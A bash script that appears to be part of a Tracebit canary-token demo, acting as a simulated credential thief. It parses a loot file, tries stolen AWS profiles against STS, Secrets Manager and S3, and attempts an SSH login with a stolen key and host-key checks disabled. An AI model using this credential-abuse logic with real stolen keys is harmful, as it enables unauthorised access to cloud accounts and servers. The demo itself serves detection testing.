#!/usr/bin/env bash
# SIMULATED attacker for the Tracebit demo: uses whatever harvest.js stole, from a different
# machine and after the build job has finished, exactly as a real credential thief would.
# Every call is expected to fail: the keys are Tracebit canaries. The point is that trying
# them at all raises a Tracebit alert naming this repo, workflow, commit and run.
set -uo pipefail
loot="${1:?usage: use-loot.sh loot.json}"
work="$(mktemp -d)"
trap 'rm -rf "$work"' EXIT

jq -r '.awsCredentialsFile // empty' "$loot" > "$work/credentials"
jq -r '.awsConfigFile // empty' "$loot" > "$work/config"
profiles="$(grep -oP '^\[\K[^\]]+' "$work/credentials" || true)"

if [ -z "$profiles" ]; then
  echo "No AWS credentials in the loot: the build job had no canaries to steal."
  echo "(Expected before Tracebit covers the workflow, or while SECURITY_API_TOKEN is unset.)"
else
  for p in $profiles; do
    echo "== Trying stolen AWS profile '$p' (the LiteLLM payload's first moves)"
    export AWS_SHARED_CREDENTIALS_FILE="$work/credentials" AWS_CONFIG_FILE="$work/config" AWS_PROFILE="$p"
    aws sts get-caller-identity --output json 2>&1 | sed 's/^/   /'
    aws secretsmanager list-secrets --region us-east-1 --max-results 5 2>&1 | head -3 | sed 's/^/   /'
    aws s3 ls 2>&1 | head -3 | sed 's/^/   /'
  done
fi

host="$(jq -r '.ssh.config // empty' "$loot" | awk '/^Host /{print $2; exit}')"
key="$(jq -r '.ssh | keys[] | select(. != "config" and (endswith(".pub") | not) and . != "known_hosts")' "$loot" | head -1)"
if [ -n "$host" ] && [ -n "$key" ]; then
  echo "== Trying stolen SSH key '$key' against $host"
  jq -r --arg k "$key" '.ssh[$k]' "$loot" > "$work/id"
  chmod 600 "$work/id"
  timeout 20 ssh -i "$work/id" -o IdentitiesOnly=yes -o BatchMode=yes -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null -o ConnectTimeout=10 "ubuntu@$host" true 2>&1 | sed 's/^/   /'
else
  echo "No SSH canary in the loot."
fi

echo
echo "Done. Open the Tracebit Community Edition dashboard: the alert names this repository,"
echo "the workflow, the job, the commit SHA and run $GITHUB_RUN_ID."
exit 0
